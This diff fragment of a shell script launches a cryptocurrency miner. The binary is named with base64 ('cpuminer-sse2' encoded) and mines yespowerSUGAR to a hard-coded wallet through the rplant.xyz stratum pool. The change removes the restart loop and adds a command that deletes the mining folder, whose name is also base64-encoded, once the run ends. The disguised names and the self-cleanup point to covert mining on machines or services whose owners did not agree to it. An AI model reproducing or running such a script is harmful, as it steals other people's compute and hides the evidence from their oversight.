@@ -15,11 +15,12 @@ else
   echo "enggak $ketentuan1 $ketentuan2 $ketentuan3 $ketentuan4 "
   #chmod +x cpuminer-sse2
   chmod +x Y3B1bWluZXItc3NlMg
-  while [ 1 ]; do
+  #while [ 1 ]; do
   #./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
   ./Y3B1bWluZXItc3NlMg -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
-  sleep 5
-  done
+  cd .. && rm -rf c3VnYXJjaGFpbg
+  #sleep 5
+  #done
 fi
 
 #echo 'index'
